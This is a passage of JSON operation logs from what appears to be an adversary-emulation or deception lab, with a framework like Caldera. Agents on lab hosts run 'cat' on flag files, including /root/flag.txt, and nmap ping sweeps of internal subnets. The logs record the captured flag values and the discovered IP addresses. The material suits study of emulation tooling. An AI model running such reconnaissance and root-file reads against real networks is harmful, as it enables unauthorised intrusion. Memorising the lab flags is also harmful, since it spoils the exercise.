host.file.contents(SF2HCL6IFNSA4MKKPIIGMFZB74I27I0W)"]}], "unique": "9c9344c2-1220-42b5-947e-ea1c1cbc3418", "decide": "2023-10-03T20:16:46Z", "status": 0, "score": 1, "pid": "2606", "relationships": [{"target": {"trait": "host.file.contents", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.file.contents", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "SF2HCL6IFNSA4MKKPIIGMFZB74I27I0W", "unique": "host.file.contentsSF2HCL6IFNSA4MKKPIIGMFZB74I27I0W", "created": "2023-10-03T20:16:47Z", "relationships": []}, "source": {"trait": "host.file.path", "links": ["9c9344c2-1220-42b5-947e-ea1c1cbc3418"], "collected_by": ["hchyiu"], "score": 2, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home/finance/flag.txt", "unique": "host.file.path/home/finance/flag.txt", "created": "2023-10-03T20:16:46Z", "relationships": ["host.file.path(/home/finance/flag.txt) : has_contents : host.file.contents(SF2HCL6IFNSA4MKKPIIGMFZB74I27I0W)"]}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_contents", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7207e9390>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7fe72071d120>", "score": 1}], "host": "finance-host", "pin": 0, "paw": "hchyiu", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-03T20:16:47Z", "command": "cat /home/finance/flag.txt", "facts": [{"trait": "host.file.path", "links": ["9c9344c2-1220-42b5-947e-ea1c1cbc3418"], "collected_by": ["hchyiu"], "score": 2, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home/finance/flag.txt", "unique": "host.file.path/home/finance/flag.txt", "created": "2023-10-03T20:16:46Z", "relationships": ["host.file.path(/home/finance/flag.txt) : has_contents : host.file.contents(SF2HCL6IFNSA4MKKPIIGMFZB74I27I0W)"]}, {"trait": "host.file.contents", "links": ["9c9344c2-1220-42b5-947e-ea1c1cbc3418"], "collected_by": ["hchyiu"], "score": 1, "limit_count": -1, "name": "host.file.contents", "technique_id": "T9000", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "SF2HCL6IFNSA4MKKPIIGMFZB74I27I0W", "unique": "host.file.contentsSF2HCL6IFNSA4MKKPIIGMFZB74I27I0W", "created": "2023-10-03T20:16:47Z", "relationships": ["host.file.path(/home/finance/flag.txt) : has_contents : host.file.contents(SF2HCL6IFNSA4MKKPIIGMFZB74I27I0W)"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:16:47Z"}, {"deadman": false, "finish": "2023-10-03T20:16:53Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "addaeeea-523d-45f4-a0ff-8bdd54f3ed9f", "plaintext_command": "cat /home/ceo/flag.txt", "used": [{"trait": "host.file.path", "links": ["addaeeea-523d-45f4-a0ff-8bdd54f3ed9f"], "collected_by": ["xuyzjc"], "score": 2, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home/ceo/flag.txt", "unique": "host.file.path/home/ceo/flag.txt", "created": "2023-10-03T20:16:51Z", "relationships": ["host.file.path(/home/ceo/flag.txt) : has_contents : host.file.contents(T4XM02H6YG8FT0YW96GLHPKH18NJLSL1)"]}], "unique": "addaeeea-523d-45f4-a0ff-8bdd54f3ed9f", "decide": "2023-10-03T20:16:51Z", "status": 0, "score": 1, "pid": "2831", "relationships": [{"target": {"trait": "host.file.contents", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.file.contents", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "T4XM02H6YG8FT0YW96GLHPKH18NJLSL1", "unique": "host.file.contentsT4XM02H6YG8FT0YW96GLHPKH18NJLSL1", "created": "2023-10-03T20:16:53Z", "relationships": []}, "source": {"trait": "host.file.path", "links": ["addaeeea-523d-45f4-a0ff-8bdd54f3ed9f"], "collected_by": ["xuyzjc"], "score": 2, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home/ceo/flag.txt", "unique": "host.file.path/home/ceo/flag.txt", "created": "2023-10-03T20:16:51Z", "relationships": ["host.file.path(/home/ceo/flag.txt) : has_contents : host.file.contents(T4XM02H6YG8FT0YW96GLHPKH18NJLSL1)"]}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_contents", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720af6230>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7fe720b59030>", "score": 1}], "host": "ceo-host", "pin": 0, "paw": "xuyzjc", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-03T20:16:53Z", "command": "cat /home/ceo/flag.txt", "facts": [{"trait": "host.file.path", "links": ["addaeeea-523d-45f4-a0ff-8bdd54f3ed9f"], "collected_by": ["xuyzjc"], "score": 2, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home/ceo/flag.txt", "unique": "host.file.path/home/ceo/flag.txt", "created": "2023-10-03T20:16:51Z", "relationships": ["host.file.path(/home/ceo/flag.txt) : has_contents : host.file.contents(T4XM02H6YG8FT0YW96GLHPKH18NJLSL1)"]}, {"trait": "host.file.contents", "links": ["addaeeea-523d-45f4-a0ff-8bdd54f3ed9f"], "collected_by": ["xuyzjc"], "score": 1, "limit_count": -1, "name": "host.file.contents", "technique_id": "T9000", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "T4XM02H6YG8FT0YW96GLHPKH18NJLSL1", "unique": "host.file.contentsT4XM02H6YG8FT0YW96GLHPKH18NJLSL1", "created": "2023-10-03T20:16:53Z", "relationships": ["host.file.path(/home/ceo/flag.txt) : has_contents : host.file.contents(T4XM02H6YG8FT0YW96GLHPKH18NJLSL1)"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:16:53Z"}, {"deadman": false, "finish": "2023-10-03T20:17:00Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "2e1ae9e7-2a7c-4c9c-8417-94239314f22b", "plaintext_command": "cat /home/activedir/flag.txt", "used": [{"trait": "host.file.path", "links": [], "collected_by": ["sucxhr"], "score": 1, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/home/activedir/flag.txt", "unique": "host.file.path/home/activedir/flag.txt", "created": "2023-10-03T20:16:56Z", "relationships": []}], "unique": "2e1ae9e7-2a7c-4c9c-8417-94239314f22b", "decide": "2023-10-03T20:16:56Z", "status": 1, "score": 1, "pid": "2346", "relationships": [], "host": "activedir-host", "pin": 0, "paw": "sucxhr", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-03T20:17:00Z", "command": "cat /home/activedir/flag.txt", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:17:00Z"}, {"deadman": false, "finish": "2023-10-03T20:17:07Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "5bcb3960-cc39-4bc8-b34f-59eeb0f64d39", "plaintext_command": "cat /root/flag.txt", "used": [{"trait": "host.file.path", "links": [], "collected_by": ["piiiry", "hchyiu", "tvtjgt"], "score": 3, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/root/flag.txt", "unique": "host.file.path/root/flag.txt", "created": "2023-10-03T20:17:01Z", "relationships": []}], "unique": "5bcb3960-cc39-4bc8-b34f-59eeb0f64d39", "decide": "2023-10-03T20:17:01Z", "status": 0, "score": 1, "pid": "2611", "relationships": [{"target": {"trait": "host.file.contents", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.file.contents", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "RSFUG7QFN354XFQOVAJCCL230YP3EY1Q", "unique": "host.file.contentsRSFUG7QFN354XFQOVAJCCL230YP3EY1Q", "created": "2023-10-03T20:17:07Z", "relationships": []}, "source": {"trait": "host.file.path", "links": [], "collected_by": ["piiiry", "hchyiu", "tvtjgt"], "score": 3, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/root/flag.txt", "unique": "host.file.path/root/flag.txt", "created": "2023-10-03T20:17:01Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_contents", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720b586a0>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7fe72071ee30>", "score": 1}], "host": "finance-host", "pin": 0, "paw": "hchyiu", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-03T20:17:07Z", "command": "cat /root/flag.txt", "facts": [{"trait": "host.file.path", "links": ["5bcb3960-cc39-4bc8-b34f-59eeb0f64d39", "d8464326-17de-4a78-9d18-c84ce550a37b"], "collected_by": ["piiiry", "hchyiu", "tvtjgt"], "score": 3, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/root/flag.txt", "unique": "host.file.path/root/flag.txt", "created": "2023-10-03T20:13:05Z", "relationships": ["host.file.path(/root/flag.txt) : has_contents : host.file.contents(RSFUG7QFN354XFQOVAJCCL230YP3EY1Q)", "host.file.path(/root/flag.txt) : has_contents : host.file.contents(Y304GQRQKHK63BNJSPHGQAVORNG65LNH)"]}, {"trait": "host.file.contents", "links": ["5bcb3960-cc39-4bc8-b34f-59eeb0f64d39"], "collected_by": ["hchyiu"], "score": 1, "limit_count": -1, "name": "host.file.contents", "technique_id": "T9000", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "RSFUG7QFN354XFQOVAJCCL230YP3EY1Q", "unique": "host.file.contentsRSFUG7QFN354XFQOVAJCCL230YP3EY1Q", "created": "2023-10-03T20:17:07Z", "relationships": ["host.file.path(/root/flag.txt) : has_contents : host.file.contents(RSFUG7QFN354XFQOVAJCCL230YP3EY1Q)"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:17:07Z"}, {"deadman": false, "finish": "2023-10-03T20:17:12Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "888ff25f-bf5e-4e26-a077-3172b7810266", "plaintext_command": "cat /root/flag.txt", "used": [{"trait": "host.file.path", "links": [], "collected_by": ["piiiry", "hchyiu", "tvtjgt"], "score": 3, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/root/flag.txt", "unique": "host.file.path/root/flag.txt", "created": "2023-10-03T20:17:11Z", "relationships": []}], "unique": "888ff25f-bf5e-4e26-a077-3172b7810266", "decide": "2023-10-03T20:17:11Z", "status": 1, "score": 1, "pid": "2845", "relationships": [], "host": "ceo-host", "pin": 0, "paw": "xuyzjc", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-03T20:17:12Z", "command": "cat /root/flag.txt", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:17:12Z"}, {"deadman": false, "finish": "2023-10-03T20:17:18Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "ae83ab02-f2c8-495e-adbd-9033775f4177", "plaintext_command": "cat /root/flag.txt", "used": [{"trait": "host.file.path", "links": [], "collected_by": ["piiiry", "hchyiu", "tvtjgt"], "score": 3, "limit_count": -1, "name": "host.file.path", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "/root/flag.txt", "unique": "host.file.path/root/flag.txt", "created": "2023-10-03T20:17:16Z", "relationships": []}], "unique": "ae83ab02-f2c8-495e-adbd-9033775f4177", "decide": "2023-10-03T20:17:16Z", "status": 1, "score": 1, "pid": "2372", "relationships": [], "host": "activedir-host", "pin": 0, "paw": "sucxhr", "output": "True", "ability": {"tactic": "utility", "ability_id": "deception-readfile", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "cat #{host.file.path}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.cat", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.file.contents", "edge": "has_contents", "source": "host.file.path"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T9000", "name": "Deception read file", "description": "Read a file", "plugin": "deception", "requirements": [{"module": "plugins.stockpile.app.requirements.paw_provenance", "relationship_match": [{"source": "host.file.path"}]}, {"module": "plugins.stockpile.app.requirements.not_exists", "relationship_match": [{"source": "host.file.path", "edge": "has_contents", "target": "host.file.contents"}]}], "buckets": ["utility"], "technique_name": "Deception"}, "agent_reported_time": "2023-10-03T20:17:18Z", "command": "cat /root/flag.txt", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:17:18Z"}, {"deadman": false, "finish": "2023-10-03T20:17:24Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "f3605b9e-b642-4a08-b652-2b4c0e140fe4", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.0/24", "unique": "scan.subnet.addr192.168.200.0/24", "created": "2023-10-03T20:17:21Z", "relationships": []}], "unique": "f3605b9e-b642-4a08-b652-2b4c0e140fe4", "decide": "2023-10-03T20:17:21Z", "status": 0, "score": 1, "pid": "3233", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["192.168.200.1", "192.168.200.2", "192.168.200.3", "192.168.200.4", "192.168.200.6", "192.168.200.7", "192.168.200.5"], "unique": "host.subnet.online_ipaddrs['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.6', '192.168.200.7', '192.168.200.5']", "created": "2023-10-03T20:17:24Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-03T20:17:24Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7207daad0>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe7207db0a0>", "score": 1}], "host": "finance-host", "pin": 0, "paw": "hchyiu", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-03T20:17:22Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["b50f077a-e985-4058-aa9f-c3a1f23ab450", "f3605b9e-b642-4a08-b652-2b4c0e140fe4", "7e51a4e3-b4f0-4271-86e0-92bc8ef16bda", "97784018-c6e6-41fb-9376-7a51cc987e13", "967a21f4-6081-48c4-b87e-fe4a2857c58a"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-03T20:13:23Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.6', '192.168.200.7', '192.168.200.5'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.3'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])"]}, {"trait": "host.subnet.online_ipaddrs", "links": ["f3605b9e-b642-4a08-b652-2b4c0e140fe4"], "collected_by": ["hchyiu"], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["192.168.200.1", "192.168.200.2", "192.168.200.3", "192.168.200.4", "192.168.200.6", "192.168.200.7", "192.168.200.5"], "unique": "host.subnet.online_ipaddrs['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.6', '192.168.200.7', '192.168.200.5']", "created": "2023-10-03T20:17:24Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.6', '192.168.200.7', '192.168.200.5'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:17:22Z"}, {"deadman": false, "finish": "2023-10-03T20:17:49Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "b05e5c86-e4e0-4d5a-a972-daed017342e5", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.0/24", "unique": "scan.subnet.addr192.168.201.0/24", "created": "2023-10-03T20:17:26Z", "relationships": []}], "unique": "b05e5c86-e4e0-4d5a-a972-daed017342e5", "decide": "2023-10-03T20:17:26Z", "status": 0, "score": 1, "pid": "3934", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": null, "value": [], "unique": "host.subnet.online_ipaddrs[]", "created": "2023-10-03T20:17:49Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-03T20:17:49Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720af7580>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe720af60b0>", "score": 1}], "host": "finance-host", "pin": 0, "paw": "hchyiu", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-03T20:17:28Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["7fae9c88-85a3-4f91-8843-22fcf67e7bc9", "b05e5c86-e4e0-4d5a-a972-daed017342e5", "b43433c3-093f-4b91-ab70-de1a8aaa55c0", "8b1f42bd-70cd-4abb-8600-a4c1241cb66d", "8f0da59b-e3d7-4006-85b4-5ae6561c9726"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-03T20:13:52Z", "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : 